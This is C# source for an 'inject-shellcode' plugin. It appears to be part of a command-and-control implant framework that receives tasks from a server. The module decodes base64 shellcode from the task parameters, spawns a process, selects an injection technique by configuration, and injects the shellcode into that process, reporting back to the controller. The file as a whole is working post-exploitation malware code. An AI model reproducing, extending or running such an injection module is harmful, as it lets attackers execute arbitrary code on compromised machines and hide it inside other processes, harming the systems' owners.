using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using System.Text.Json;
using System.Reflection;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "inject-shellcode";
        private IDataBroker messageManager { get; set; }
        private IServiceConfig config { get; set; }
        private ILogger logger { get; set; }
        private IRuntimeExecutor spawner { get; set; }
        private List<ITechnique> techniques = new List<ITechnique>();
        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
            this.spawner = spawner;
            this.logger = logger;
            this.config = config;
            GetTechniques();
        }

        public async Task Execute(ServerJob job)
        {
            InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);
            string message = string.Empty;
            if (args is null || !args.Validate(out message))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = message,
                    completed = true,
                    status = "error"
                });
                return;
            }

            //Create new process
            byte[] buf = Misc.Base64DecodeToByteArray(args.asm);

            SpawnOptions so = args.GetSpawnOptions(job.task.id);
            try
            {
                var technique = techniques.Where(x => x.id == this.config.inject).First();
                if (technique is null)
                {
                    await WriteDebug("Failed to find technique", job.task.id);
                    return;
                }

                if(!await technique.Inject(spawner, so, buf))
                {
                    messageManager.WriteLine("Inject Failed.", job.task.id, true, "error");
                    return;
                }
            }
            catch (Exception e)
            {
                await WriteDebug(e.ToString(), job.task.id);
            }
            return;
        }

        private void GetTechniques()
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            foreach(Type t in asm.GetTypes())
            {
                if (!typeof(ITechnique).IsAssignableFrom(t))
                {
                    continue;
                }
                try
                {
                    var instance = (ITechnique)Activator.CreateInstance(t);
                    if (instance != null){
                        techniques.Add(instance);
                    }
                }
                catch
                {
                    continue;
                }
            }
        }

        private async Task WriteDebug(string message, string task_id){
            if (config.debug)
            {
                this.messageManager.WriteLine(message, task_id, false);
            }
        }
    }
}
